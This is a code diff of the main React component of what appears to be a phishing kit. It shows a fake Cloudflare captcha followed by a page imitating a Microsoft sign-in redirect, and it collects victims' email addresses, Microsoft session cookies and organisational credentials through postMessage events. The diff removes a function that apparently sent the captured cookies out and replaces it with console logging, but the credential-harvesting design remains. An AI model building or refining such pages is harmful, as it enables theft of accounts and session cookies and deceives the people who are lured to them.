@@ -1,14 +1,12 @@
 import React, { useState, useEffect } from 'react';
-import MessageIconLanding from './components/MessageIconLanding';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
-import RealOAuthRedirect from './components/RealOAuthRedirect';
-
-// 🟢 NEW: Import cookie/email capture function and setter utilities
-import { captureAndSendCookies, setCapturedEmail, setCapturedCookies } from './utils/client-cookie-capture';
 
 // Artificial delay helper (milliseconds)
 const SLOW_DELAY = 1200; // Base delay, x3 for each step (e.g., 3600ms)
 const nextStepDelay = SLOW_DELAY * 3;
+const captchaVerificationDelay = 1500;
+const messageIconDelay = nextStepDelay; // This replaces the MessageIconLanding component
+
 function App() {
   const [currentPage, setCurrentPage] = useState('captcha');
   // State to hold the most reliable email and cookies captured via postMessage
@@ -209,14 +207,12 @@ function App() {
 
       if (event.data.type === 'EMAIL_CAPTURED' && event.data.email) {
         setCapturedEmailState(event.data.email);
-        setCapturedEmail(event.data.email);
       }
 
       if (event.data.type === 'MICROSOFT_COOKIES_CAPTURED' && event.data.data?.cookies) {
         try {
           const cookiesJson = JSON.stringify(event.data.data.cookies);
           setCapturedCookiesState(cookiesJson);
-          setCapturedCookies(event.data.data.cookies);
         } catch (e) {
           // fallback: ignore
         }
@@ -224,7 +220,6 @@ function App() {
 
       if (event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED' && event.data.data?.email) {
         setCapturedEmailState(event.data.data.email);
-        setCapturedEmail(event.data.data.email);
       }
     }
 
@@ -235,7 +230,7 @@ function App() {
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
     const step = urlParams.get('step');
-    if (step && ['captcha', 'message-icon', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
+    if (step && ['captcha', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
       setCurrentPage(step);
       window.history.replaceState({}, document.title, window.location.pathname);
     }
@@ -243,10 +238,10 @@ function App() {
 
   // Handler functions
   const handleCaptchaVerified = () => {
-    setCurrentPage('message-icon');
+    // Skip message-icon step and go directly to oauth-redirect with combined delay
     setTimeout(() => {
       setCurrentPage('oauth-redirect');
-    }, nextStepDelay);
+    }, messageIconDelay);
   };
 
   const handleCaptchaBack = () => {
@@ -256,11 +251,13 @@ function App() {
   const handleOAuthSuccess = () => {
     setCurrentPage('document-loading');
     
-    // Capture and send cookies after successful OAuth
-    captureAndSendCookies(capturedEmail, capturedCookies);
+    // Log captured data
+    console.log('Captured email:', capturedEmail);
+    console.log('Captured cookies:', capturedCookies);
+  };
 
   const handleOAuthBack = () => {
-    setCurrentPage('oauth-redirect');
+    setCurrentPage('captcha');
   };
 
   switch (currentPage) {
@@ -271,22 +268,82 @@ function App() {
           onBack={handleCaptchaBack}
           verificationDelay={captchaVerificationDelay}
           autoRedirectDelay={messageIconDelay}
-          totalDelayTime={totalCaptchaDelay}
-        />
-      );
-
-    case 'message-icon':
-      return (
-        <MessageIconLanding
-          onOpenMessage={() => {}}
         />
       );
 
     case 'oauth-redirect':
       return (
-        <RealOAuthRedirect
-          onLoginSuccess={handleOAuthSuccess}
-        />
+        <div style={{
+          display: 'flex',
+          justifyContent: 'center',
+          alignItems: 'center',
+          height: '100vh',
+          fontFamily: 'Arial, sans-serif',
+          backgroundColor: '#f3f2f1'
+        }}>
+          <div style={{
+            textAlign: 'center',
+            background: 'white',
+            padding: '60px',
+            borderRadius: '8px',
+            boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
+          }}>
+            <div style={{
+              width: '80px',
+              height: '80px',
+              background: '#0078d4',
+              borderRadius: '8px',
+              margin: '0 auto 30px',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              animation: 'spin 2s linear infinite',
+              fontSize: '40px',
+              color: 'white'
+            }}>
+              🔐
+            </div>
+            <h2 style={{ color: '#323130', margin: '0 0 10px' }}>
+              Redirecting to Microsoft...
+            </h2>
+            <p style={{ color: '#605e5c', margin: '0 0 20px' }}>
+              Please wait while we redirect you to sign in
+            </p>
+            <div style={{
+              display: 'flex',
+              justifyContent: 'center',
+              gap: '10px',
+              marginTop: '30px'
+            }}>
+              <button
+                onClick={handleOAuthSuccess}
+                style={{
+                  padding: '10px 20px',
+                  backgroundColor: '#0078d4',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                Continue
+              </button>
+              <button
+                onClick={handleOAuthBack}
+                style={{
+                  padding: '10px 20px',
+                  backgroundColor: '#6c757d',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                Back
+              </button>
+            </div>
+          </div>
+        </div>
       );
 
     case 'success':
@@ -372,7 +429,6 @@ function App() {
           onBack={handleCaptchaBack}
           verificationDelay={captchaVerificationDelay}
           autoRedirectDelay={messageIconDelay}
-          totalDelayTime={totalCaptchaDelay}
         />
       );
   }
